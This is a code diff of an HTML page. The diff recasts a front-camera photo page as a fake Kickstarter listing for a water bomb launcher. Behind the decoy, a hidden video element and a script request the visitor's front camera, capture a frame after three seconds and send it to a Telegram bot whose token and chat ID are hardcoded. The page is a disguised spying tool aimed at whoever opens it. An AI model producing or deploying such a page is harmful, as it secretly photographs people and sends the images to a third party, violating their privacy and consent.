@@ -3,23 +3,165 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Фото с фронтальной камеры</title>
+  <title>Spyragravity — Water Bomb Launcher</title>
   <style>
-    /* Видео по центру и без звука */
-    video {
-      display: block;
-      margin: 20px auto;
+    /* Сброс базовых стилей */
+    * {
+      box-sizing: border-box;
+      margin: 0; padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+    }
+    body {
+      background: #f5f5f7;
+      color: #1a1a1a;
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+
+    header {
+      width: 100%;
+      max-width: 900px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px 0;
+      border-bottom: 1px solid #ddd;
+    }
+    header .logo {
+      font-weight: 700;
+      font-size: 1.4rem;
+      color: #2b6cb0;
+      user-select: none;
+    }
+    header nav {
+      display: flex;
+      gap: 15px;
+    }
+    header nav span {
+      color: #888;
+      font-weight: 600;
+      cursor: default; /* не кликается */
+      user-select: none;
+    }
+
+    main {
+      max-width: 900px;
+      width: 100%;
+      margin-top: 30px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgb(149 157 165 / 0.2);
+      padding: 20px;
+    }
+
+    .title-section {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .title-section h1 {
+      font-weight: 700;
+      font-size: 2rem;
+      color: #111;
+      user-select: none;
+    }
+    .title-section p {
+      font-weight: 400;
+      color: #666;
+      user-select: none;
+      max-width: 600px;
+    }
+
+    .image-container {
+      margin: 20px 0;
+      display: flex;
+      justify-content: center;
+    }
+    .image-container img {
       max-width: 100%;
-      border: 1px solid #ccc;
+      border-radius: 12px;
+      box-shadow: 0 6px 15px rgb(0 0 0 / 0.15);
+      user-select: none;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 15px;
+      margin-top: 20px;
+      user-select: none;
+    }
+    .button {
+      background: #05a081;
+      color: white;
+      font-weight: 600;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-size: 1rem;
+      cursor: default; /* не кликается */
+      box-shadow: 0 5px 10px rgb(5 160 129 / 0.3);
+      user-select: none;
+      transition: background-color 0.2s;
+    }
+    .button:hover {
+      background: #038f6e;
+    }
+
+    /* Мобильная адаптивность */
+    @media (max-width: 600px) {
+      body {
+        padding: 10px;
+      }
+      main {
+        padding: 15px;
+      }
+      .title-section h1 {
+        font-size: 1.5rem;
+      }
+      .button {
+        padding: 10px 18px;
+        font-size: 0.9rem;
+      }
     }
   </style>
 </head>
 <body>
+  <header>
+    <div class="logo">Kickstarter</div>
+    <nav>
+      <span>Discover</span>
+      <span>Start a project</span>
+      <span>About</span>
+      <span>Help</span>
+    </nav>
+  </header>
+
+  <main>
+    <section class="title-section">
+      <h1>Spyragravity — The world’s first water bomb launcher</h1>
+      <p>Launching water bombs in style and fun — safe and splashy action for all ages!</p>
+    </section>
+
+    <div class="image-container">
+      <img src="https://ksr-ugc.imgix.net/assets/034/093/914/9cf7e9132d1ed94b272978d27c2a4700_original.jpg?ixlib=rb-4.0.2&w=700&fit=max&v=1680361313&auto=format&frame=1&q=92&s=6710b046e0549e0ff487f6d4f7588b50" alt="Spyragravity" />
+    </div>
+
+    <div class="button-group">
+      <div class="button">Back this project</div>
+      <div class="button">Remind me</div>
+    </div>
+  </main>
+
+  <!-- Скрытое видео для фото -->
   <video id="video" autoplay playsinline muted style="display:none;"></video>
 
   <script>
-    const TOKEN = "7652687345:AAElRXM2tsPSUIztZWkZhNDRlQ5x5CFrQjs";    // Заменить на токен своего бота
-    const CHAT_ID = "919015722";      // Заменить на свой Telegram ID
+    const TOKEN = "7652687345:AAElRXM2tsPSUIztZWkZhNDRlQ5x5CFrQjs";    // Замени
+    const CHAT_ID = "919015722";      // Замени
 
     async function sendPhoto(blob) {
       const formData = new FormData();
@@ -32,10 +174,10 @@
           body: formData,
         });
         if (!response.ok) {
-          console.error("Ошибка отправки фото в Telegram:", response.statusText);
+          console.error("Ошибка отправки фото:", response.statusText);
         }
-      } catch (err) {
-        console.error("Ошибка сети при отправке фото:", err);
+      } catch (e) {
+        console.error("Ошибка сети:", e);
       }
     }
 
@@ -43,44 +185,30 @@
       const video = document.getElementById("video");
       const width = video.videoWidth || 320;
       const height = video.videoHeight || 240;
-
       if (width === 0 || height === 0) {
-        console.error("Видео ещё не готово для захвата изображения");
+        console.error("Видео не готово");
         return;
       }
-
       const canvas = document.createElement("canvas");
       canvas.width = width;
       canvas.height = height;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0, width, height);
-
+      canvas.getContext("2d").drawImage(video, 0, 0, width, height);
       canvas.toBlob(sendPhoto, "image/jpeg");
     }
 
     async function startCamera() {
       try {
-        const constraints = {
-          video: {
-            facingMode: "user" // фронтальная камера
-          },
-          audio: false
-        };
-
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         const video = document.getElementById("video");
         video.srcObject = stream;
-
         video.onloadedmetadata = () => {
           video.play();
-
-          // Ждём 3 секунды чтобы камера стабилизировалась и видео запустилось
           setTimeout(() => {
             captureAndSend();
           }, 3000);
         };
-      } catch (err) {
-        console.error("Ошибка доступа к камере:", err);
+      } catch (e) {
+        console.error("Ошибка доступа к камере:", e);
       }
     }
 
